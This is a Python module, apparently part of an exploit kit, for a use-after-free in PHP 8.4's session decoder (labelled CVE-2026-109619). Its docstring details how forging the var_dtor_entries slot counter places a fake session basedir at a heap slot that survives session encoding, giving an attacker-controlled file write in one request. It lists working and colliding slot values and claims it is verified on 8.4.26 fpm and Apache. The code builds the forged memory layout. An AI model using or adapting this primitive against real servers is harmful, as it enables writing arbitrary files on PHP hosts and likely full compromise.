# INDEX: high-slot dtor forge for basedir placement | all | needs dangling BG decoder
"""High-DT-slot survive-encode placement: forge DT->used_slots so the fake ps_files->basedir
backing lands at a slot php_session_encode's reallocations do not clobber (CVE-2026-109619
session-decode UAF write-delivery).

Mechanism (ext/session/session.c php_session_encode, Zend/zend_variables.c var_tmp_var; php-src 8.4):
  php_session_flush -> php_session_encode reallocates the LOW var_dtor_entries (DT) slots before
  ps_files_open() reads basedir, so a fake backing at a low slot is overwritten (its len becomes a
  heap pointer -> ps_files_path_create returns NULL). Forging DT->used_slots = S makes var_tmp_var()
  place the decode's two pairs at DT->data[S]/[S+1] and the fake backing at DT->data[S+2] =
  0x10 + (S+2)*16 -- a HIGH slot clear of the encode's low-slot allocations, so basedir->len survives
  and the write lands in a single request (worker survives). S must miss the slots the encode hits
  (S=50 works; {0,20,80,120,200} collide). The backing is a bare {size_t len @ fz, char path[] @
  fz+8}; ps_files_path_create() reads only len and bytes.

Precondition: a worker with the dangling BG(unserialize) decoder.

API:
  place(carrier, path_nul, s=50) -> fz. Forges DT->used_slots = s at offset 0 and writes
    {len, path_nul} at DT->data[s+2]. path_nul is the target path with a trailing NUL. Mutates
    carrier in place.

Tested: 8.4.26-fpm, 8.4.26-apache mod_php.
Credit: kengwang, Calif Research.
Stage: VERIFIED 8.4.26.
"""
import struct

from primitives.geometry.var_dtor import var_dtor_data_off

DEFAULT_S = 50   # a high DT slot clear of php_session_encode's low-slot reallocations


def place(carrier, path_nul, s=DEFAULT_S):
    """Forge DT->used_slots = `s` at carrier offset 0 and write the fake basedir backing
    {len, path_nul} at DT->data[s+2] = 0x10 + (s+2)*16. Mutates `carrier`; returns the offset fz."""
    struct.pack_into("<q", carrier, 0, s)                   # DT->used_slots = S
    fz = var_dtor_data_off(s + 2)                           # fake backing @ DT->data[S+2]
    struct.pack_into("<Q", carrier, fz, len(path_nul))      # basedir->len
    carrier[fz + 8:fz + 8 + len(path_nul)] = path_nul       # basedir->val = path + NUL
    return fz
